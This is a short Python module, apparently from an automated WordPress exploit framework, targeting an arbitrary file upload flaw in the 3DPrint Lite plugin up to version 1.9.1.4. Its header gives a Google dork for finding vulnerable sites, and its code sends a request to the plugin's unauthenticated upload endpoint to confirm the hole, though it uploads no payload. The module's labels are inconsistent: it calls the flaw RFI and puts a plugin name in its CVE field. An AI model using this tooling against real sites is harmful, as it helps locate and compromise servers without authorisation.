# Exploit Title: Wordpress Plugin 3DPrint Lite 1.9.1.4 - Arbitrary File Upload
# Google Dork: inurl:/wp-content/plugins/3dprint-lite/
# Date: 22/09/2021
# Exploit Author: spacehen
# Vendor Homepage: https://wordpress.org/plugins/3dprint-lite/
# Version: <= 1.9.1.4
# Tested on: Ubuntu 20.04.1

import requests
from ....handler.retry.retryrequest import RetryRequest
from ...exploit import Exploit, CMS, Categorys
from ....config import Config

retry_request = RetryRequest(max_retries=3)
CONFIG = Config()

class DprintExploit(Exploit):
    name = "Wordpress Plugin 3DPrint"
    cms = CMS.Wordpress
    category = Categorys.RFI
    cve = "Wordpress Plugin 3DPrint"

    def run(self, url):
        r = retry_request.retry(requests.get, f"{url}/wp-admin/admin-ajax.php?action=p3dlite_handle_upload", timeout=CONFIG.timeouts(), headers={'User-Agent': CONFIG.useragent()})
        if "jsonrpc" in r.text:
            return True
        return False